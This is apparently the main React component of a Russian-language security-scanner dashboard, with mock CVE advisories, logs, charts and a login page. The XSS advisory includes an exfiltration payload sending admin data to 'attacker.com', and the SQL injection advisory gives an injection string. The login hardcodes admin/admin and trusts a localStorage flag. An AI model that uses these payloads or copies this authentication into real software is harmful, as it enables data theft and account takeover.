import { useEffect, useMemo, useRef, useState } from 'react';
import Chart from 'chart.js/auto';
import zoomPlugin from 'chartjs-plugin-zoom';

Chart.register(zoomPlugin);

const vulnData = [
  {
    id: 'CVE-2025-1024',
    title: 'RCE в модуле отчётности',
    severity: 'critical',
    score: 9.8,
    description: 'Удалённое выполнение кода через загрузку шаблонов PDF.',
    affected: 'reporting-service@1.3.1',
    status: 'эксплуатация зафиксирована',
    article: {
      overview: 'Критическая уязвимость удалённого выполнения кода (RCE) обнаружена в модуле генерации отчётов. Проблема позволяет злоумышленнику загрузить вредоносный шаблон PDF, который при обработке выполняет произвольный код на сервере.',
      technical: 'Уязвимость возникает в функции `processTemplate()` модуля `reporting-service`. При загрузке PDF-шаблона система использует библиотеку `pdf-lib@2.1.0`, которая не проверяет содержимое загружаемых файлов. Злоумышленник может внедрить JavaScript-код в метаданные PDF, который выполняется при рендеринге отчёта.',
      attackVector: 'Атакующий создаёт PDF-файл с внедрённым JavaScript в поле `/JavaScript` объекта документа. При загрузке через эндпоинт `/api/reports/templates` и последующем рендеринге отчёта код выполняется в контексте сервера с правами пользователя `reporting-service`.',
      impact: 'Полный компромисс сервера отчётности, возможность чтения конфиденциальных данных, доступ к внутренней сети, потенциальная эскалация привилегий.',
      remediation: 'Обновить `reporting-service` до версии 1.3.2+, где добавлена валидация PDF-файлов и санитизация метаданных. Временно отключить загрузку пользовательских шаблонов. Внедрить sandbox для обработки PDF-файлов.',
      references: ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1024', 'https://github.com/advisories/GHSA-xxxx-xxxx']
    }
  },
  {
    id: 'CVE-2025-0711',
    title: 'SQL-инъекция в API логов',
    severity: 'high',
    score: 8.6,
    description: 'Неэкранированные параметры фильтрации при запросах логов.',
    affected: 'log-api@2.0.0',
    status: 'патч готовится',
    article: {
      overview: 'Уязвимость SQL-инъекции обнаружена в эндпоинте фильтрации логов. Параметры запроса напрямую подставляются в SQL-запрос без должной санитизации, что позволяет выполнять произвольные SQL-команды.',
      technical: 'Проблема находится в функции `getFilteredLogs()` контроллера `LogController`. При формировании WHERE-условий параметры `level`, `source` и `dateRange` конкатенируются в строку запроса без использования prepared statements. Это позволяет злоумышленнику модифицировать SQL-запрос.',
      attackVector: 'Атакующий отправляет запрос вида: `GET /api/logs?level=critical\' OR 1=1--&source=test`. Строка `OR 1=1--` комментирует остальную часть запроса и возвращает все логи независимо от фильтров. Более сложные атаки могут включать UNION SELECT для извлечения данных из других таблиц.',
      impact: 'Несанкционированный доступ к логам всех пользователей, возможность извлечения конфиденциальной информации (токены, пароли в логах), потенциальный доступ к другим таблицам БД через UNION-атаки.',
      remediation: 'Переписать все запросы с использованием параметризованных запросов (prepared statements). Добавить валидацию и whitelist для параметров фильтрации. Внедрить rate limiting на эндпоинт. Обновить до версии 2.0.1+ с исправлениями.',
      references: ['OWASP SQL Injection', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0711']
    }
  },
  {
    id: 'CVE-2025-0554',
    title: 'Обход авторизации',
    severity: 'critical',
    score: 9.1,
    description: 'Ошибочная проверка JWT при refresh-потоке.',
    affected: 'auth-service@4.8.2',
    status: 'патч выкатывается',
    article: {
      overview: 'Критическая уязвимость обхода авторизации в механизме обновления JWT-токенов. Ошибка в логике валидации refresh-токенов позволяет злоумышленнику получить новые access-токены для произвольных пользователей.',
      technical: 'В функции `refreshToken()` сервиса авторизации проверяется только подпись refresh-токена, но не проверяется соответствие `user_id` в токене и в базе данных. Кроме того, система не инвалидирует старые refresh-токены при выдаче новых, что позволяет использовать один refresh-токен многократно.',
      attackVector: 'Атакующий перехватывает refresh-токен пользователя (через XSS, MITM или утечку в логах). Затем модифицирует payload токена, меняя `user_id` на ID целевого пользователя, и отправляет запрос на `/api/auth/refresh`. Система выдаёт новый access-токен для целевого пользователя.',
      impact: 'Полный компромисс аккаунтов пользователей, несанкционированный доступ к конфиденциальным данным, возможность выполнения действий от имени других пользователей, нарушение конфиденциальности.',
      remediation: 'Добавить проверку соответствия user_id в токене и БД. Внедрить одноразовые refresh-токены (токен инвалидируется после использования). Добавить проверку IP-адреса и user-agent при обновлении токенов. Обновить до версии 4.8.3+.',
      references: ['JWT Best Practices', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0554']
    }
  },
  {
    id: 'CVE-2025-0172',
    title: 'Leaky bucket в очередях',
    severity: 'medium',
    score: 6.8,
    description: 'Переполнение очереди ведёт к частичной потере сообщений.',
    affected: 'queue-engine@0.9.4',
    status: 'в работе',
    article: {
      overview: 'Уязвимость типа "Leaky Bucket" в системе очередей сообщений. При переполнении очереди система теряет сообщения вместо их буферизации или отклонения с ошибкой, что может привести к потере критически важных данных.',
      technical: 'Проблема в реализации очереди в модуле `queue-engine`. При достижении лимита размера очереди (10000 сообщений) система начинает перезаписывать старые сообщения новыми без логирования или уведомления. Алгоритм использует циклический буфер, но не отслеживает переполнение.',
      attackVector: 'Злоумышленник может намеренно переполнить очередь, отправляя большое количество сообщений через API или эксплуатируя уязвимость, которая генерирует множество событий. Это приводит к потере важных сообщений (логи безопасности, транзакции, уведомления).',
      impact: 'Потеря критически важных сообщений и событий, нарушение целостности данных, невозможность отслеживания инцидентов безопасности, потенциальные финансовые потери при потере транзакций.',
      remediation: 'Внедрить механизм backpressure: при переполнении очереди отклонять новые сообщения с HTTP 503. Добавить мониторинг размера очереди и алерты. Реализовать persistent storage для критических сообщений. Добавить логирование всех отброшенных сообщений. Обновить до версии 0.9.5+.',
      references: ['Message Queue Best Practices', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0172']
    }
  },
  {
    id: 'CVE-2025-0083',
    title: 'XSS в админ-панели',
    severity: 'high',
    score: 8.0,
    description: 'Неправильная очистка markdown-комментариев.',
    affected: 'console@3.1.0',
    status: 'запланировано',
    article: {
      overview: 'Уязвимость межсайтового скриптинга (XSS) в админ-панели управления. Проблема возникает при обработке markdown-комментариев в интерфейсе. Система не полностью санитизирует пользовательский ввод перед рендерингом.',
      technical: 'В компоненте `CommentEditor` админ-панели используется библиотека `markdown-it` для преобразования markdown в HTML. Однако система разрешает использование HTML-тегов в markdown и не применяет достаточную санитизацию. Злоумышленник может внедрить JavaScript через теги `<script>`, события `onerror`, `onclick` или через специальные markdown-синтаксисы, которые преобразуются в небезопасный HTML.',
      attackVector: 'Атакующий создаёт комментарий с markdown-кодом, содержащим вредоносный JavaScript: `![x](x "onerror=alert(document.cookie)")` или использует HTML-инъекцию: `<img src=x onerror="fetch(\'/api/admin/users\').then(r=>r.json()).then(d=>fetch(\'http://attacker.com/steal?data=\'+btoa(JSON.stringify(d))))">`. При просмотре комментария администратором код выполняется в его браузере.',
      impact: 'Кража сессионных токенов администраторов, несанкционированный доступ к админ-панели, возможность выполнения действий от имени администратора, компрометация всей системы управления.',
      remediation: 'Внедрить строгую санитизацию HTML через библиотеку DOMPurify. Отключить выполнение JavaScript в markdown-рендерере. Использовать Content Security Policy (CSP) для предотвращения выполнения inline-скриптов. Обновить до версии 3.1.1+ с исправлениями.',
      references: ['OWASP XSS Prevention', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0083']
    }
  },
  {
    id: 'CVE-2024-9910',
    title: 'Утечка секретов через отчёты',
    severity: 'medium',
    score: 6.4,
    description: 'Отчёт содержит необрезанные конфиденциальные поля.',
    affected: 'reporting-service@1.2.9',
    status: 'решено',
    article: {
      overview: 'Уязвимость утечки конфиденциальной информации через генерацию отчётов. Система включает в отчёты полные значения чувствительных полей (API-ключи, токены, пароли) вместо их маскирования или исключения.',
      technical: 'В функции `generateReport()` модуля отчётности при формировании JSON/CSV-отчётов система включает все поля объектов без фильтрации. Конфиденциальные поля, помеченные как `sensitive: true` в схеме данных, всё равно попадают в отчёты в открытом виде. Проблема затрагивает как пользовательские отчёты, так и системные логи.',
      attackVector: 'Злоумышленник с правами на генерацию отчётов (или получивший доступ к аккаунту через другую уязвимость) создаёт отчёт, который включает конфиденциальные данные. Отчёт может быть экспортирован, отправлен по email или сохранён в доступном месте, где его может перехватить атакующий.',
      impact: 'Утечка API-ключей, токенов доступа, паролей в открытом виде, нарушение конфиденциальности пользовательских данных, потенциальный компромисс связанных сервисов при использовании украденных ключей.',
      remediation: 'Внедрить автоматическое маскирование конфиденциальных полей (показывать только первые/последние 4 символа). Добавить whitelist полей, разрешённых для экспорта. Внедрить аудит доступа к отчётам. Обновить до версии 1.3.0+, где проблема исправлена.',
      references: ['Data Leakage Prevention', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9910']
    }
  },
];

const logEntries = [
  { id: 1, timestamp: '12:02', severity: 'critical', title: 'Попытка эксплуатации RCE', source: 'WAF /edge-03' },
  { id: 2, timestamp: '12:00', severity: 'high', title: 'Аномалия в портах (скан 65535)', source: 'scan-node-1' },
  { id: 3, timestamp: '11:55', severity: 'medium', title: 'Неудачные входы в админ-панель', source: 'console' },
  { id: 4, timestamp: '11:47', severity: 'critical', title: 'Создание подозрительного токена', source: 'auth-service' },
  { id: 5, timestamp: '11:43', severity: 'high', title: 'Блокировка IP 213.178.*', source: 'edge-fw' },
  { id: 6, timestamp: '11:30', severity: 'medium', title: 'Рост ошибок 5xx +18%', source: 'api-gateway' },
];

const chartDataset = {
  labels: ['Пн', 'Вт', 'Ср', 'Чт', 'Пт', 'Сб', 'Вс'],
  critical: [5, 6, 4, 7, 5, 8, 6],
  high: [7, 8, 6, 5, 4, 5, 3],
  medium: [4, 3, 5, 4, 3, 2, 3],
};

export default function App() {
  // Аутентификация
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return localStorage.getItem('isAuthenticated') === 'true';
  });
  const [loginError, setLoginError] = useState('');
  const [loginForm, setLoginForm] = useState({ username: '', password: '' });

  const [activeTab, setActiveTab] = useState('dashboard');
  const [selectedSeverity, setSelectedSeverity] = useState('all');
  const [selectedVuln, setSelectedVuln] = useState(vulnData[0]);
  const vulnItemRefs = useRef({});
  const [showMedium, setShowMedium] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [isGeneratingPdf, setIsGeneratingPdf] = useState(false);
  
  // Состояние для интеграций
  const [integrations, setIntegrations] = useState({
    gitlab: { enabled: false, url: '', token: '' },
    github: { enabled: false, token: '', repo: '' },
    jira: { enabled: false, url: '', email: '', token: '', project: '' },
    slack: { enabled: false, webhookUrl: '', channel: '' },
    telegram: { enabled: false, botToken: '', chatId: '' },
    webhook: { enabled: false, url: '', secret: '' },
  });

  const chartRef = useRef(null);
  const chartInstance = useRef(null);

  // Функция для генерации PDF отчета
  const generatePdfReport = async () => {
    setIsGeneratingPdf(true);
    try {
      // Формируем данные для отчета на основе текущих данных
      const reportData = {
        title: 'Security Report',
        description: 'Detailed security scanning results report',
        logAnalysis: {
          summary: {
            totalLogs: 22,
            threatsFound: 1,
            criticalCount: 1,
            highCount: 0,
            mediumCount: 0,
            lowCount: 0,
          },
          patterns: [
            {
              type: 'DDoS',
              severity: 'Critical',
              description: 'Potential DDoS attack detected with high traffic values: 1200 requests per second. Requests are coming from multiple IP addresses, with blocking of several IPs from ranges.',
              count: 1,
              examples: [
                '2025-11-14T18:00:10Z WARN  [System] High number of requests detected: 1200 requests per second',
                '2025-11-14T18:00:10Z WARN  [System] Server under potential DDoS attack, activating mitigation protocols...',
              ],
              recommendations: [
                'Strengthen DDoS attack protection measures.',
                'Conduct analysis and optimization of handling large numbers of requests.',
              ],
            },
          ],
        },
      };

      const response = await fetch('http://localhost:3000/reports/generate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(reportData),
      });

      if (!response.ok) {
        throw new Error('Ошибка при генерации отчета');
      }

      // Получаем PDF как blob
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `security-report-${new Date().toISOString().split('T')[0]}.pdf`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    } catch (error) {
      console.error('Ошибка при генерации PDF:', error);
      alert('Не удалось сгенерировать PDF отчет. Проверьте подключение к серверу.');
    } finally {
      setIsGeneratingPdf(false);
    }
  };

  useEffect(() => {
    if (!chartRef.current) return;

    if (chartInstance.current) {
      chartInstance.current.destroy();
    }

    const ctx = chartRef.current.getContext('2d');
    const criticalGradient = ctx.createLinearGradient(0, 0, 0, 300);
    criticalGradient.addColorStop(0, 'rgba(255, 109, 122, 0.5)');
    criticalGradient.addColorStop(1, 'rgba(255, 109, 122, 0)');

    const highGradient = ctx.createLinearGradient(0, 0, 0, 300);
    highGradient.addColorStop(0, 'rgba(78, 199, 241, 0.5)');
    highGradient.addColorStop(1, 'rgba(78, 199, 241, 0)');

    const mediumGradient = ctx.createLinearGradient(0, 0, 0, 300);
    mediumGradient.addColorStop(0, 'rgba(141, 220, 255, 0.45)');
    mediumGradient.addColorStop(1, 'rgba(141, 220, 255, 0)');

    const datasets = [
          {
            label: 'Критические',
            data: chartDataset.critical,
            borderColor: '#ff6d7a',
            backgroundColor: criticalGradient,
            tension: 0.4,
            fill: true,
            pointRadius: 0,
            borderWidth: 2,
          },
          {
            label: 'Высокие',
            data: chartDataset.high,
            borderColor: '#4ec7f1',
            backgroundColor: highGradient,
            tension: 0.4,
            fill: true,
            pointRadius: 0,
            borderWidth: 2,
          },
    ];

    if (showMedium) {
      datasets.push({
        label: 'Средние',
        data: chartDataset.medium,
        borderColor: '#8ddcff',
        backgroundColor: mediumGradient,
        tension: 0.4,
        fill: true,
        pointRadius: 0,
        borderWidth: 2,
      });
    }

    chartInstance.current = new Chart(ctx, {
      type: 'line',
      data: {
        labels: chartDataset.labels,
        datasets,
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        interaction: {
          mode: 'index',
          intersect: false,
        },
        plugins: {
          legend: { display: false },
          tooltip: {
            backgroundColor: 'rgba(5, 10, 25, 0.85)',
            borderColor: 'rgba(255, 255, 255, 0.1)',
            borderWidth: 1,
            titleColor: '#fff',
            bodyColor: '#dbe9ff',
            padding: 12,
            displayColors: false,
          },
          zoom: {
            pan: {
              enabled: true,
              mode: 'xy',
              modifierKey: 'shift',
            },
            zoom: {
              wheel: {
                enabled: true,
                speed: 0.05,
              },
              pinch: {
                enabled: true,
              },
              drag: {
                enabled: true,
                modifierKey: 'ctrl',
              },
              mode: 'xy',
              limits: {
                x: { min: 0, max: chartDataset.labels.length - 1 },
                y: { min: 0, max: 15 },
              },
            },
          },
        },
        scales: {
          x: {
            ticks: { color: 'rgba(255,255,255,0.5)' },
            grid: { display: false },
          },
          y: {
            ticks: { color: 'rgba(255,255,255,0.4)' },
            grid: { color: 'rgba(255,255,255,0.06)' },
            suggestedMax: 10,
            beginAtZero: true,
          },
        },
      },
    });

    return () => chartInstance.current?.destroy();
  }, [showMedium]);

  const filteredLogs = useMemo(() => {
    if (selectedSeverity === 'all') return logEntries;
    return logEntries.filter((log) => log.severity === selectedSeverity);
  }, [selectedSeverity]);

  // Функция входа
  const handleLogin = (e) => {
    e.preventDefault();
    setLoginError('');

    if (loginForm.username === 'admin' && loginForm.password === 'admin') {
      setIsAuthenticated(true);
      localStorage.setItem('isAuthenticated', 'true');
    } else {
      setLoginError('Неверный логин или пароль');
    }
  };

  // Функция выхода
  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem('isAuthenticated');
    setLoginForm({ username: '', password: '' });
  };

  // Если не авторизован, показываем страницу логина
  if (!isAuthenticated) {
    return (
      <div className="login-page">
        <div className="login-container glass">
          <div className="login-header">
            <div className="login-logo">
              <div className="pulse" />
              <span>Sinep</span>
            </div>
            <h2>Вход в систему</h2>
            <p className="muted">Введите учетные данные для доступа</p>
          </div>

          <form onSubmit={handleLogin} className="login-form">
            {loginError && (
              <div className="login-error">
                {loginError}
              </div>
            )}

            <div className="form-group">
              <label htmlFor="username">Логин</label>
              <input
                id="username"
                type="text"
                placeholder="Введите логин"
                value={loginForm.username}
                onChange={(e) =>
                  setLoginForm({ ...loginForm, username: e.target.value })
                }
                required
                autoFocus
              />
            </div>

            <div className="form-group">
              <label htmlFor="password">Пароль</label>
              <input
                id="password"
                type="password"
                placeholder="Введите пароль"
                value={loginForm.password}
                onChange={(e) =>
                  setLoginForm({ ...loginForm, password: e.target.value })
                }
                required
              />
            </div>

            <button type="submit" className="login-button">
              Войти
            </button>
          </form>

          
        </div>
      </div>
    );
  }

  return (
    <div className="layout">
      <aside className="sidebar glass">
        <div className="logo">
          <div className="pulse" />
          <span>Sinep</span>
        </div>
        <nav className="nav">
          <a className="nav-link active" href="#">
            Дашборд
          </a>
          <a className="nav-link" href="#">
            Логи
          </a>
          <a className="nav-link" href="#">
            Настройки
          </a>
        </nav>
        <div className="sidebar-footer">
          <p>Статус сканера</p>
          <span className="status online">online</span>
          <button className="logout-button" onClick={handleLogout} title="Выйти">
            Выйти
          </button>
        </div>
      </aside>

      <main className="content">
        <div className="tabs">
          <button
            className={`tab ${activeTab === 'dashboard' ? 'active' : ''}`}
            onClick={() => setActiveTab('dashboard')}
          >
            Дашборд
          </button>
          <button
            className={`tab ${activeTab === 'scan' ? 'active' : ''}`}
            onClick={() => setActiveTab('scan')}
          >
            Сканирование
          </button>
          <button
            className={`tab ${activeTab === 'integrations' ? 'active' : ''}`}
            onClick={() => setActiveTab('integrations')}
          >
            Интеграции
          </button>
          <button
            className={`tab ${activeTab === 'logs' ? 'active' : ''}`}
            onClick={() => setActiveTab('logs')}
          >
            Логи
          </button>
        </div>

        <header className="hero glass">
          <div>
            <p className="eyebrow">обнаружено угроз</p>
            <h1>28 активных уязвимостей</h1>
            <p className="muted">Последний анализ 5 минут назад</p>
          </div>
          <button className="cta">Запустить сканирование</button>
        </header>

        {activeTab === 'dashboard' && (
          <>
        <section className="grid">
          <article className="card glass">
            <header className="card-header">
              <div>
                <h2>Список уязвимостей</h2>
                <p className="muted">Приоритет по критичности</p>
              </div>
              <span className="badge">TOP 6</span>
            </header>

            <ul className="vuln-list">
              {vulnData.map((vuln) => (
                    <li
                      key={vuln.id}
                      ref={(el) => (vulnItemRefs.current[vuln.id] = el)}
                      className={`vuln-item ${selectedVuln.id === vuln.id ? 'active' : ''} severity-${vuln.severity}`}
                      onClick={() => {
                        setSelectedVuln(vuln);
                        // Плавная прокрутка к выбранному элементу
                        setTimeout(() => {
                          vulnItemRefs.current[vuln.id]?.scrollIntoView({
                            behavior: 'smooth',
                            block: 'nearest',
                          });
                        }, 100);
                      }}
                      onMouseEnter={(e) => {
                        if (selectedVuln.id !== vuln.id) {
                          e.currentTarget.style.transform = 'translateX(4px)';
                        }
                      }}
                      onMouseLeave={(e) => {
                        if (selectedVuln.id !== vuln.id) {
                          e.currentTarget.style.transform = 'translateX(0)';
                        }
                      }}
                    >
                      <div className="vuln-content">
                    <p className="vuln-title">{vuln.title}</p>
                    <span className="muted">{vuln.id}</span>
                  </div>
                      <div className="vuln-right">
                  <div className={`severity ${vuln.severity}`}>
                    {vuln.severity.toUpperCase()} · {vuln.score}
                        </div>
                        <span className="vuln-arrow">→</span>
                  </div>
                </li>
              ))}
            </ul>
          </article>

          <article className="card glass">
            <header className="card-header">
              <div>
                <h2>Динамика выявлений</h2>
                <p className="muted">Последние 7 дней</p>
              </div>
              <div className="legend">
                <span className="dot critical" />
                критические
                <span className="dot high" />
                высокие
                    <label className="toggle">
                      <input
                        type="checkbox"
                        checked={showMedium}
                        onChange={(e) => setShowMedium(e.target.checked)}
                      />
                      <span>+ средние</span>
                    </label>
              </div>
            </header>
            <div className="chart-container">
              <div className="chart-hint">
                <span className="muted">
                  <span className="desktop-hint">Колесико мыши: масштаб • Shift+перетаскивание: прокрутка • Ctrl+перетаскивание: зум</span>
                  <span className="mobile-hint">Двойное касание: зум • Перетаскивание: прокрутка</span>
                </span>
              </div>
            <canvas ref={chartRef} height="280" />
              <div className="chart-controls">
                <button
                  className="chart-btn"
                  onClick={() => {
                    if (chartInstance.current) {
                      chartInstance.current.resetZoom('default');
                    }
                  }}
                  title="Сбросить масштаб"
                >
                  ↻
                </button>
                <button
                  className="chart-btn"
                  onClick={() => {
                    if (chartInstance.current) {
                      chartInstance.current.zoom(1.2, 'default');
                    }
                  }}
                  title="Увеличить"
                >
                  +
                </button>
                <button
                  className="chart-btn"
                  onClick={() => {
                    if (chartInstance.current) {
                      chartInstance.current.zoom(0.8, 'default');
                    }
                  }}
                  title="Уменьшить"
                >
                  −
                </button>
              </div>
            </div>
          </article>
        </section>

            {selectedVuln && selectedVuln.article && (
              <section className="card glass vuln-details">
                <header className="card-header">
                  <div>
                    <p className="muted">детальный анализ</p>
                    <h2>{selectedVuln.title}</h2>
                    <p className="muted" style={{ marginTop: '0.5rem', fontSize: '0.9rem' }}>
                      {selectedVuln.id} · {selectedVuln.affected}
                    </p>
                  </div>
                  <div className={`severity ${selectedVuln.severity}`}>
                    {selectedVuln.severity.toUpperCase()} · {selectedVuln.score}
                  </div>
                </header>

                <article className="vuln-article">
                  <section className="article-section">
                    <h3 className="article-title">Обзор проблемы</h3>
                    <p className="article-text">{selectedVuln.article.overview}</p>
                  </section>

                  <section className="article-section">
                    <h3 className="article-title">Технические детали</h3>
                    <p className="article-text">{selectedVuln.article.technical}</p>
                  </section>

                  <section className="article-section">
                    <h3 className="article-title">Вектор атаки</h3>
                    <p className="article-text">{selectedVuln.article.attackVector}</p>
                  </section>

                  <section className="article-section">
                    <h3 className="article-title">Потенциальный ущерб</h3>
                    <p className="article-text">{selectedVuln.article.impact}</p>
                  </section>

                  <section className="article-section">
                    <h3 className="article-title">Рекомендации по устранению</h3>
                    <p className="article-text">{selectedVuln.article.remediation}</p>
                  </section>

                  {selectedVuln.article.references && selectedVuln.article.references.length > 0 && (
                    <section className="article-section">
                      <h3 className="article-title">Дополнительные ресурсы</h3>
                      <ul className="references-list">
                        {selectedVuln.article.references.map((ref, idx) => (
                          <li key={idx}>
                            <a href={ref} target="_blank" rel="noopener noreferrer" className="reference-link">
                              {ref}
                            </a>
                          </li>
                        ))}
                      </ul>
                    </section>
                  )}

                  <div className="details-meta">
                    <div className="meta-item">
                      <span className="meta-label">Статус:</span>
                      <span className="meta-value">{selectedVuln.status}</span>
                    </div>
                    <div className="meta-item">
                      <span className="meta-label">Затронуто:</span>
                      <span className="meta-value">{selectedVuln.affected}</span>
                    </div>
                  </div>
                </article>
              </section>
            )}
          </>
        )}

        {activeTab === 'scan' && (
          <>
            <section className="card glass scan-status">
              <div className="scan-header">
                <div>
                  <h2>Сканирование приложения</h2>
                  <p className="muted">Анализ безопасности в реальном времени</p>
                </div>
                <div className="scan-actions">
                  <button
                    className="pdf-button download-button"
                    onClick={generatePdfReport}
                    disabled={isGeneratingPdf}
                    title="Скачать PDF отчет"
                  >
                    {isGeneratingPdf ? (
                      <>
                        <span className="pdf-button-icon">⏳</span>
                        Генерация...
                      </>
                    ) : (
                      <>
                        <span className="pdf-button-icon">📥</span>
                        Скачать отчет
                      </>
                    )}
                  </button>
                  <button
                    className="cta"
                    onClick={() => {
                      setIsScanning(true);
                      setScanProgress(0);
                      const interval = setInterval(() => {
                        setScanProgress((prev) => {
                          if (prev >= 100) {
                            clearInterval(interval);
                            setIsScanning(false);
                            return 100;
                          }
                          return prev + 2;
                        });
                      }, 100);
                    }}
                    disabled={isScanning}
                  >
                    {isScanning ? 'Сканирование...' : 'Запустить сканирование'}
                  </button>
                </div>
              </div>

              {isScanning && (
                <div className="scan-progress">
                  <div className="progress-bar">
                    <div
                      className="progress-fill"
                      style={{ width: `${scanProgress}%` }}
                    />
                  </div>
                  <p className="progress-text">{scanProgress}% завершено</p>
                </div>
              )}

              <div className="marquee-container">
                <div className="marquee">
                  <span>
                    {isScanning
                      ? `🔍 Сканирование модулей... Проверка зависимостей... Анализ кода... Поиск уязвимостей... ${scanProgress}%`
                      : '✅ Сканирование завершено • Обнаружено 28 уязвимостей • 6 критических • 12 высоких • 10 средних • Последнее сканирование: 5 минут назад'}
                  </span>
                </div>
              </div>
            </section>

            <section className="grid">
              <article className="card glass">
                <header className="card-header">
                  <div>
                    <h2>Обнаруженные уязвимости</h2>
                    <p className="muted">Результаты сканирования</p>
                  </div>
                  <span className="badge">{vulnData.length} найдено</span>
                </header>

                <ul className="vuln-list">
                  {vulnData.map((vuln) => (
                    <li
                      key={vuln.id}
                      ref={(el) => (vulnItemRefs.current[vuln.id] = el)}
                      className={`vuln-item ${selectedVuln.id === vuln.id ? 'active' : ''} severity-${vuln.severity}`}
                      onClick={() => {
                        setSelectedVuln(vuln);
                        setTimeout(() => {
                          vulnItemRefs.current[vuln.id]?.scrollIntoView({
                            behavior: 'smooth',
                            block: 'nearest',
                          });
                        }, 100);
                      }}
                      onMouseEnter={(e) => {
                        if (selectedVuln.id !== vuln.id) {
                          e.currentTarget.style.transform = 'translateX(4px)';
                        }
                      }}
                      onMouseLeave={(e) => {
                        if (selectedVuln.id !== vuln.id) {
                          e.currentTarget.style.transform = 'translateX(0)';
                        }
                      }}
                    >
                      <div className="vuln-content">
                        <p className="vuln-title">{vuln.title}</p>
                        <span className="muted">{vuln.id}</span>
                      </div>
                      <div className="vuln-right">
                        <div className={`severity ${vuln.severity}`}>
                          {vuln.severity.toUpperCase()} · {vuln.score}
                        </div>
                        <span className="vuln-arrow">→</span>
                      </div>
                    </li>
                  ))}
                </ul>
              </article>

              <article className="card glass">
                <header className="card-header">
                  <div>
                    <h2>Отчет о сканировании</h2>
                    <p className="muted">Детальная статистика</p>
                  </div>
                  <button
                    className="pdf-button"
                    onClick={generatePdfReport}
                    disabled={isGeneratingPdf}
                    title="Скачать PDF отчет"
                  >
                    {isGeneratingPdf ? (
                      <>
                        <span className="pdf-button-icon">⏳</span>
                        Генерация...
                      </>
                    ) : (
                      <>
                        <span className="pdf-button-icon">📄</span>
                        PDF отчет
                      </>
                    )}
                  </button>
                </header>

                <div className="report-stats">
                  <div className="stat-item">
                    <div className="stat-value critical">6</div>
                    <div className="stat-label">Критические</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-value high">12</div>
                    <div className="stat-label">Высокие</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-value medium">10</div>
                    <div className="stat-label">Средние</div>
                  </div>
                </div>

                <div className="report-details">
                  <div className="report-row">
                    <span className="report-label">Время сканирования:</span>
                    <span className="report-value">2 мин 34 сек</span>
                  </div>
                  <div className="report-row">
                    <span className="report-label">Проверено модулей:</span>
                    <span className="report-value">47</span>
                  </div>
                  <div className="report-row">
                    <span className="report-label">Проверено зависимостей:</span>
                    <span className="report-value">156</span>
                  </div>
                  <div className="report-row">
                    <span className="report-label">Проверено строк кода:</span>
                    <span className="report-value">124,567</span>
                  </div>
                  <div className="report-row">
                    <span className="report-label">Общий CVSS Score:</span>
                    <span className="report-value">8.2</span>
                  </div>
                </div>
              </article>
            </section>

            <section className="card glass recommendations">
              <header className="card-header">
                <div>
                  <h2>Рекомендации по устранению</h2>
                  <p className="muted">Приоритетные действия</p>
                </div>
              </header>

              <div className="recommendations-list">
                <div className="recommendation-item priority-high">
                  <div className="rec-icon">🔴</div>
                  <div className="rec-content">
                    <h3>Немедленные действия</h3>
                    <p>Обновить auth-service до версии 4.8.3+ для устранения критической уязвимости обхода авторизации (CVE-2025-0554).</p>
                    <span className="rec-action">Обновить сейчас →</span>
                  </div>
                </div>

                <div className="recommendation-item priority-high">
                  <div className="rec-icon">🟡</div>
                  <div className="rec-content">
                    <h3>Высокий приоритет</h3>
                    <p>Внедрить валидацию PDF-файлов в reporting-service для предотвращения RCE-атак (CVE-2025-1024).</p>
                    <span className="rec-action">Планировать патч →</span>
                  </div>
                </div>

                <div className="recommendation-item priority-medium">
                  <div className="rec-icon">🔵</div>
                  <div className="rec-content">
                    <h3>Средний приоритет</h3>
                    <p>Переписать SQL-запросы в log-api с использованием prepared statements для устранения SQL-инъекций.</p>
                    <span className="rec-action">Включить в спринт →</span>
                  </div>
                </div>

                <div className="recommendation-item priority-medium">
                  <div className="rec-icon">🔵</div>
                  <div className="rec-content">
                    <h3>Улучшения безопасности</h3>
                    <p>Внедрить Content Security Policy (CSP) в админ-панели для защиты от XSS-атак.</p>
                    <span className="rec-action">Добавить в backlog →</span>
                  </div>
                </div>
              </div>
            </section>

            {selectedVuln && selectedVuln.article && (
              <section className="card glass vuln-details">
                <header className="card-header">
                  <div>
                    <p className="muted">детальный анализ</p>
                    <h2>{selectedVuln.title}</h2>
                    <p className="muted" style={{ marginTop: '0.5rem', fontSize: '0.9rem' }}>
                      {selectedVuln.id} · {selectedVuln.affected}
                    </p>
                  </div>
                  <div className={`severity ${selectedVuln.severity}`}>
                    {selectedVuln.severity.toUpperCase()} · {selectedVuln.score}
                  </div>
                </header>

                <article className="vuln-article">
                  <section className="article-section">
                    <h3 className="article-title">Обзор проблемы</h3>
                    <p className="article-text">{selectedVuln.article.overview}</p>
                  </section>

                  <section className="article-section">
                    <h3 className="article-title">Технические детали</h3>
                    <p className="article-text">{selectedVuln.article.technical}</p>
                  </section>

                  <section className="article-section">
                    <h3 className="article-title">Вектор атаки</h3>
                    <p className="article-text">{selectedVuln.article.attackVector}</p>
                  </section>

                  <section className="article-section">
                    <h3 className="article-title">Потенциальный ущерб</h3>
                    <p className="article-text">{selectedVuln.article.impact}</p>
                  </section>

                  <section className="article-section">
                    <h3 className="article-title">Рекомендации по устранению</h3>
                    <p className="article-text">{selectedVuln.article.remediation}</p>
                  </section>

                  {selectedVuln.article.references && selectedVuln.article.references.length > 0 && (
                    <section className="article-section">
                      <h3 className="article-title">Дополнительные ресурсы</h3>
                      <ul className="references-list">
